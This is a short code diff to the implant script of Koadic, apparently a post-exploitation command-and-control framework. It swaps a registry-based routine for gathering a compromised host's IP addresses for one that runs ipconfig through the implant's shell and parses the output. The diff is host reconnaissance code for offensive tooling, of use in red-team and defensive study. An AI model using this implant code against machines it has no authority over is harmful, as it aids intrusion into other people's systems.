@@ -231,6 +231,7 @@ Koadic.user.CWD = function()
     return "";
 }
 
+/*
 Koadic.user.IPAddrs = function()
 {
     var interfaces = Koadic.shell.exec("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces", "%TEMP%\\"+Koadic.uuid()+".txt");
@@ -253,7 +254,14 @@ Koadic.user.IPAddrs = function()
     }
     return retstring;
 }
+*/
 
+Koadic.user.IPAddrs = function()
+{
+    var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
+    var ip = ipconfig.split("IPv4 Address")[1].split(": ")[1].split("\r\n")[0];
+    return ip;
+}
 
 Koadic.user.info = function()
 {
